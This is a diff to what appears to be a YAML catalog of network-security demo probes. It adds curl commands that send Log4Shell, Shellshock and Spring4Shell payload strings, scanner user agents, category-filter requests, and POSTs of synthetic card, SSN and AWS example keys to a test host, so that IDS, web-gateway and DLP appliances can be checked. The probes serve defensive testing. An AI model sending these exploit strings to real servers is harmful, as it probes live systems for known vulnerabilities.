@@ -232,6 +232,67 @@
   talking_point: "Base64 beacon body + a tell-tale user-agent — the shape of real command-and-control."
 
 # ---------------------------------------------------------------------------
+# Modern-exploit pack — the marquee CVE signatures every IPS markets.
+#
+# Each payload is a FIXED LITERAL STRING in the argv (never built from free text) sent
+# as a header / query string to the SAME benign tmNIDS origin the rest of the IDS
+# catalog uses. NOTHING IS EXPLOITED: the JNDI/LDAP references point at the RFC 2606
+# reserved `.invalid` TLD, they are inert text in a header, and the app never resolves
+# or fetches them. The sensor matches the pattern on the wire — which is the whole
+# point — while the request itself is an ordinary HTTP GET to a test host.
+# ---------------------------------------------------------------------------
+
+- id: ns-log4shell
+  label: "Log4Shell JNDI probe (CVE-2021-44228)"
+  class: ns-ids
+  runner: curl
+  commands:
+    - ["curl", "-s", "-S", "-o", "{devnull}", "-w", "%{http_code}|", "--connect-timeout", "6", "--max-time", "10", "-H", "User-Agent: ${jndi:ldap://scanner.invalid/a}", "-H", "X-Api-Version: ${jndi:dns://scanner.invalid/b}", "http://testmynids.org"]
+  flags: [needs_internet, needs_et_ruleset]
+  severity: crit
+  threat_class: exploit
+  expected_fire: "ET EXPLOIT — Apache Log4j JNDI injection attempt (CVE-2021-44228) in an HTTP header"
+  talking_point: "The CVE that defined 2021 and still the most-asked-for IPS signature. The JNDI string is inert text in a header pointing at a reserved .invalid name — nothing resolves, nothing executes."
+
+- id: ns-shellshock
+  label: "Shellshock CGI probe (CVE-2014-6271)"
+  class: ns-ids
+  runner: curl
+  commands:
+    - ["curl", "-s", "-S", "-o", "{devnull}", "-w", "%{http_code}|", "--connect-timeout", "6", "--max-time", "10", "-H", "User-Agent: () { :;}; echo secvitals-shellshock-test", "http://testmynids.org/cgi-bin/test.cgi"]
+  flags: [needs_internet, needs_et_ruleset]
+  severity: crit
+  threat_class: exploit
+  expected_fire: "ET EXPLOIT — Bash CVE-2014-6271 (Shellshock) function definition in an HTTP header"
+  talking_point: "The classic header-borne command injection. The payload only echoes a marker string, and the target CGI does not exist."
+
+- id: ns-spring4shell
+  label: "Spring4Shell class-loader probe (CVE-2022-22965)"
+  class: ns-ids
+  runner: curl
+  commands:
+    - ["curl", "-s", "-S", "-o", "{devnull}", "-w", "%{http_code}|", "--connect-timeout", "6", "--max-time", "10", "http://testmynids.org/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=secvitals-test"]
+  flags: [needs_internet, needs_et_ruleset]
+  severity: warn
+  threat_class: exploit
+  expected_fire: "ET EXPLOIT — Spring Framework class-loader manipulation (CVE-2022-22965)"
+  talking_point: "A query-string data-binding attack — the signature is the parameter name, so a plain GET trips it."
+
+- id: ns-scanner-ua
+  label: "Security-scanner user agents (Nikto / sqlmap / Nmap)"
+  class: ns-ids
+  runner: curl
+  commands:
+    - ["curl", "-s", "-S", "-o", "{devnull}", "-w", "%{http_code}|", "--connect-timeout", "6", "--max-time", "10", "-A", "Mozilla/5.00 (Nikto/2.1.6)", "http://testmynids.org"]
+    - ["curl", "-s", "-S", "-o", "{devnull}", "-w", "%{http_code}|", "--connect-timeout", "6", "--max-time", "10", "-A", "sqlmap/1.7-dev (https://sqlmap.org)", "http://testmynids.org"]
+    - ["curl", "-s", "-S", "-o", "{devnull}", "-w", "%{http_code}|", "--connect-timeout", "6", "--max-time", "10", "-A", "Nmap Scripting Engine (https://nmap.org/book/nse.html)", "http://testmynids.org"]
+  flags: [needs_internet, needs_et_ruleset]
+  severity: warn
+  threat_class: recon
+  expected_fire: "ET SCAN — Nikto / sqlmap / Nmap NSE user agent observed outbound"
+  talking_point: "Scanner tooling announces itself in the User-Agent. Outbound from a corporate host it usually means a compromised endpoint, not a pentest."
+
+# ---------------------------------------------------------------------------
 # Secure Web Gateway (web categorization / reputation) + IP reputation.
 #
 # The SWG denies by SILENTLY DROPPING the flow — there is NO block page. A deny is observed
@@ -361,6 +422,109 @@
   expected_fire: "Web threat / SWG (unwanted software) · Deny → timeout"
   talking_point: "Sanctioned unwanted-software test page."
 
+# --- Category breadth pack -------------------------------------------------
+# A modern SWG is graded on how many CATEGORIES it classifies correctly, so these are
+# one benign request each to a canonical, unambiguous representative of a category a
+# customer is likely to have a policy on. Same argv shape as the categories above, so
+# the silent-drop classifier is unchanged. Only the genuinely awkward destinations
+# (adult, live exploit tooling) carry hits_live_suspect_hosts.
+
+- id: web-cat-genai
+  label: "Generative AI / Shadow AI — chatgpt.com"
+  class: ns-webcc
+  runner: curl
+  commands:
+    - ["curl", "-sS", "-A", "SecVitals-Demo", "-o", "{devnull}", "-w", "%{http_code}|%{size_download}|%{url_effective}", "--connect-timeout", "6", "--max-time", "9", "https://chatgpt.com/"]
+  flags: [needs_internet]
+  severity: warn
+  threat_class: policy
+  expected_fire: "SWG category Generative AI · Deny → timeout"
+  talking_point: "The category everyone is writing policy for right now — shadow-AI usage and the data that leaves with it."
+
+- id: web-cat-webmail
+  label: "Personal webmail — mail.yahoo.com"
+  class: ns-webcc
+  runner: curl
+  commands:
+    - ["curl", "-sS", "-A", "SecVitals-Demo", "-o", "{devnull}", "-w", "%{http_code}|%{size_download}|%{url_effective}", "--connect-timeout", "6", "--max-time", "9", "https://mail.yahoo.com/"]
+  flags: [needs_internet]
+  severity: info
+  threat_class: policy
+  expected_fire: "SWG category Personal Webmail · Deny → timeout"
+  talking_point: "Personal webmail is the oldest exfiltration path there is — a staple acceptable-use category."
+
+- id: web-cat-dating
+  label: "Dating — match.com"
+  class: ns-webcc
+  runner: curl
+  commands:
+    - ["curl", "-sS", "-A", "SecVitals-Demo", "-o", "{devnull}", "-w", "%{http_code}|%{size_download}|%{url_effective}", "--connect-timeout", "6", "--max-time", "9", "https://www.match.com/"]
+  flags: [needs_internet]
+  severity: info
+  threat_class: policy
+  expected_fire: "SWG category Dating · Deny → timeout"
+  talking_point: "Everyday acceptable-use policy — benign destination, clear category."
+
+- id: web-cat-jobsearch
+  label: "Job Search — indeed.com"
+  class: ns-webcc
+  runner: curl
+  commands:
+    - ["curl", "-sS", "-A", "SecVitals-Demo", "-o", "{devnull}", "-w", "%{http_code}|%{size_download}|%{url_effective}", "--connect-timeout", "6", "--max-time", "9", "https://www.indeed.com/"]
+  flags: [needs_internet]
+  severity: info
+  threat_class: policy
+  expected_fire: "SWG category Job Search · Deny → timeout"
+  talking_point: "A category HR asks about more often than security does — useful for showing policy granularity."
+
+- id: web-cat-weapons
+  label: "Weapons — guns.com"
+  class: ns-webcc
+  runner: curl
+  commands:
+    - ["curl", "-sS", "-A", "SecVitals-Demo", "-o", "{devnull}", "-w", "%{http_code}|%{size_download}|%{url_effective}", "--connect-timeout", "6", "--max-time", "9", "https://www.guns.com/"]
+  flags: [needs_internet]
+  severity: info
+  threat_class: policy
+  expected_fire: "SWG category Weapons · Deny → timeout"
+  talking_point: "A lawful retailer that lands squarely in the Weapons category — exactly what category filtering is for."
+
+- id: web-cat-drugs
+  label: "Marijuana / Drugs — leafly.com"
+  class: ns-webcc
+  runner: curl
+  commands:
+    - ["curl", "-sS", "-A", "SecVitals-Demo", "-o", "{devnull}", "-w", "%{http_code}|%{size_download}|%{url_effective}", "--connect-timeout", "6", "--max-time", "9", "https://www.leafly.com/"]
+  flags: [needs_internet]
+  severity: info
+  threat_class: policy
+  expected_fire: "SWG category Marijuana / Drugs · Deny → timeout"
+  talking_point: "A jurisdiction-sensitive category — handy when the customer operates across regions with different rules."
+
+- id: web-cat-hacking
+  label: "Hacking / exploit tooling — exploit-db.com"
+  class: ns-webcc
+  runner: curl
+  commands:
+    - ["curl", "-sS", "-A", "SecVitals-Demo", "-o", "{devnull}", "-w", "%{http_code}|%{size_download}|%{url_effective}", "--connect-timeout", "6", "--max-time", "9", "https://www.exploit-db.com/"]
+  flags: [needs_internet, hits_live_suspect_hosts]
+  severity: warn
+  threat_class: policy
+  expected_fire: "SWG category Hacking / Computer Security · Deny → timeout"
+  talking_point: "A legitimate research resource that most policies still deny from a general-user zone — gated, because fetching it from a customer-adjacent host looks odd in their SIEM."
+
+- id: web-cat-adult
+  label: "Adult content — category test"
+  class: ns-webcc
+  runner: curl
+  commands:
+    - ["curl", "-sS", "-A", "SecVitals-Demo", "-o", "{devnull}", "-w", "%{http_code}|%{size_download}|%{url_effective}", "--connect-timeout", "6", "--max-time", "9", "https://www.pornhub.com/"]
+  flags: [needs_internet, hits_live_suspect_hosts]
+  severity: warn
+  threat_class: policy
+  expected_fire: "SWG category Adult / Pornography · Deny → timeout"
+  talking_point: "The single most-demoed web-filter category. Gated by default so it never fires by accident on a customer network — enable it deliberately, in a lab."
+
 - id: ip-rep-tor
   label: "IP Reputation — Tor Proxy nodes (:443)"
   class: ns-iprep
@@ -372,3 +536,59 @@
   threat_class: policy
   expected_fire: "IP reputation 'Tor Proxy' · Deny → timeouts (reported as a ratio)"
   talking_point: "Control probe first: if egress is down the whole test is INVALID; otherwise report N-of-M blocked, never a single verdict. Live Tor nodes — flagged."
+  console_hint: "IP reputation / threat-intel hits — filter by the destination IPs below; the appliance's own reputation counters are authoritative, not our ratio."
+
+# ---------------------------------------------------------------------------
+# DLP / data-exfiltration — content inspection.
+#
+# Every value below is DELIBERATELY SYNTHETIC and publicly documented as a test value:
+# the universal Visa test PAN (4111 1111 1111 1111), an SSN in the 666 area (never
+# issued by the SSA), and AWS's own documentation example key. NO REAL DATA IS SENT.
+# They POST over cleartext HTTP to the same benign tmNIDS origin the IDS catalog uses,
+# so an inline DLP engine sees the pattern WITHOUT needing SSL inspection. (An
+# SSL-inspection variant belongs with a self-hosted echo target — see the roadmap.)
+#
+# Classification is unchanged: a DLP drop shows as curl rc 28/7/56 or HTTP 403/451
+# (blocked), a completed POST as allowed, and a DNS/TLS failure as error — never a
+# false blocked.
+# ---------------------------------------------------------------------------
+
+- id: dlp-pan
+  label: "Credit-card data (synthetic test PAN)"
+  class: ns-dlp
+  runner: curl
+  commands:
+    - ["curl", "-s", "-S", "-o", "{devnull}", "-w", "%{http_code}|", "--connect-timeout", "6", "--max-time", "10", "-X", "POST", "-H", "Content-Type: application/x-www-form-urlencoded", "-d", "cardholder=Test+Persona&card=4111111111111111&exp=1229&cvv=123", "http://testmynids.org"]
+  flags: [needs_internet]
+  severity: crit
+  threat_class: dlp
+  expected_fire: "DLP — credit-card number (PCI) in an outbound HTTP POST body"
+  talking_point: "4111 1111 1111 1111 is the universal Visa TEST number — it passes Luhn, so a real DLP engine matches it, but it belongs to no one."
+  console_hint: "DLP / content-inspection log — filter by the 5-tuple below; expect a credit-card or PCI data-pattern match."
+
+- id: dlp-ssn
+  label: "Personal data (never-issued SSN)"
+  class: ns-dlp
+  runner: curl
+  commands:
+    - ["curl", "-s", "-S", "-o", "{devnull}", "-w", "%{http_code}|", "--connect-timeout", "6", "--max-time", "10", "-X", "POST", "-H", "Content-Type: application/x-www-form-urlencoded", "-d", "name=Test+Persona&ssn=666-12-3456&dob=1970-01-01", "http://testmynids.org"]
+  flags: [needs_internet]
+  severity: crit
+  threat_class: dlp
+  expected_fire: "DLP — US Social Security Number pattern in an outbound HTTP POST body"
+  talking_point: "The 666 area code has never been issued by the SSA, so this matches the PII pattern while identifying no real person."
+  console_hint: "DLP / content-inspection log — filter by the 5-tuple below; expect a PII or SSN data-pattern match."
+
+- id: dlp-secrets
+  label: "Credentials & keys (documentation example values)"
+  class: ns-dlp
+  runner: curl
+  commands:
+    - ["curl", "-s", "-S", "-o", "{devnull}", "-w", "%{http_code}|", "--connect-timeout", "6", "--max-time", "10", "-X", "POST", "-H", "Content-Type: application/x-www-form-urlencoded", "-d", "aws_access_key_id=AKIAIOSFODNN7EXAMPLE&aws_secret_access_key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY", "http://testmynids.org"]
+    - ["curl", "-s", "-S", "-o", "{devnull}", "-w", "%{http_code}|", "--connect-timeout", "6", "--max-time", "10", "-X", "POST", "-H", "Content-Type: text/plain", "-d", "-----BEGIN RSA PRIVATE KEY-----MIIBOgIBAAJBAKj34GkxFhD90vcNLYLInFEX6Ppy1tPf9Cnzj4p4WGeKLs1Pt8Qu-----END RSA PRIVATE KEY-----", "http://testmynids.org"]
+  flags: [needs_internet]
+  severity: crit
+  threat_class: dlp
+  expected_fire: "DLP — cloud access key / private-key material in an outbound HTTP POST body"
+  talking_point: "AKIAIOSFODNN7EXAMPLE is the key AWS itself uses in its documentation, and the PEM block is truncated filler — recognizable to a secrets matcher, useless to an attacker."
+  console_hint: "DLP / content-inspection log — filter by the 5-tuple below; expect a credentials or private-key data-pattern match."
